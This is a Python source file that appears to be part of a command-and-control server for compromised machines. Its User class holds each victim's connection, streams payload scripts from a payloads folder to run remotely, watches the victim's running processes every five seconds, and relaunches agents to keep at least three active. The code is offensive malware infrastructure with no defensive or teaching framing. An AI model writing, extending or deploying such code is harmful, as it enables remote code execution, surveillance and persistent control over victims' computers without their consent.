from datetime import datetime
import logging
import asyncio
import ast
import os

class User:
    def __init__(
            self, 
            uuid="", 
            ip="", 
            port=0000, 
            reader: asyncio.StreamReader|None=None, 
            writer: asyncio.StreamWriter|None=None, 
            is_admin=False, 
            module_data={},
            connection_time=datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z"),
            first_name="",
            last_name="",
            username="",
            agent_module=None
        ):
        self.uuid = uuid
        self.ip = ip
        self.port = port
        self.connection_time = connection_time
        self.reader: asyncio.StreamReader|None = reader
        self.writer: asyncio.StreamWriter|None = writer
        self.agents = []
        self.is_admin = is_admin
        self.module_data = module_data
        self.first_name = first_name
        self.last_name = last_name
        self.username = username
        self.lock = asyncio.Lock()
        self.min_agents = 3
        self.processes = []
        self.watch_processes_task = None
        self.watch_agents_task = None
        self.agent_module = agent_module
        if self.is_logged_in():
            self.watch_processes_task = asyncio.create_task(self.watch_processes())
            self.watch_agents_task = asyncio.create_task(self.watch_agents())
        
        
    async def watch_processes(self):
        while True:
            processes = await self.execute("./modules/payloads/payload_list_processes.py", final_character=b"}]")
            self.processes = ast.literal_eval(processes)
            await asyncio.sleep(5)

    async def watch_agents(self):
        while True:
            while len(self.agents) < self.min_agents:
                await self.agent_module.launch_agent(self.uuid)
                await asyncio.sleep(5)
            await asyncio.sleep(5)

    def watch_processes_if_not_running(self):
        if not self.watch_processes_task:
            self.watch_processes_task = asyncio.create_task(self.watch_processes())

    def watch_agents_if_not_running(self):
        if not self.watch_agents_task:
            self.watch_agents_task = asyncio.create_task(self.watch_agents())

    def start_not_running_watchers(self):
        self.watch_processes_if_not_running()
        self.watch_agents_if_not_running()

    def __repr__(self):
        return f"{self.ip}:{self.port}"
    
    def to_dict(self):
        return {
            'uuid': self.uuid,
            'ip': self.ip,
            'port': self.port,
            'connection_time': self.connection_time,
            'is_admin': self.is_admin,
            'first_name': self.first_name,
            'last_name': self.last_name,
            'username': self.username,
            'module_data': self.module_data,
        }
    
    def set_module_data(self, module_name, data):
        self.module_data[module_name] = data

    def get_module_data(self, module_name):
        return self.module_data.get(module_name, {})

    @classmethod
    def from_dict(cls, data):
        user = cls(
            uuid=data.get('uuid'),
            ip=data.get('ip'),
            port=data.get('port'),
            is_admin=data.get('is_admin'),
            module_data=data.get('module_data'),
            connection_time = data.get('connection_time'),
            first_name = data.get('first_name'),
            last_name = data.get('last_name'),
            username = data.get('username')
        )
        return user
    
    async def execute(self, file_path, replacements={}, final_character=b"", wait_output=True):
        async with self.lock:
            if not self.is_logged_in():
                logging.error(f"User {self.ip} is not infected")
                raise Exception("User is not infected")

            if not os.path.exists(file_path):
                logging.error(f"File {file_path} does not exist")
                raise Exception(f"File {file_path} does not exist")

            with open(file_path, "rb") as f:
                content = f.read()
                for key, value in replacements.items():
                    content = content.replace(key, value)

                if len(self.agents):
                    await self.agents[0].execute(content)
                    self.agents.pop(0)

                else:
                    self.writer.write(content)
                    await self.writer.drain()

                    if not wait_output:
                        return

                    output = b""
                    while not output.endswith(final_character):
                        chunk = await self.reader.read(4096)
                        output += chunk
                        if not final_character:
                            break


                    decoded_output = output.decode()
                    return decoded_output
    
    def is_logged_in(self):
        return self.reader is not None and self.writer is not None
    
    async def send(self, message):
        if self.is_logged_in():
            self.writer.write(message.encode())
            await self.writer.drain()
        else:
            raise Exception("Victim is not infected")
    
    async def receive(self, buffer_size=4096):
        if self.is_logged_in():
            return await self.reader.read(buffer_size)
        raise Exception("Victim is not infected")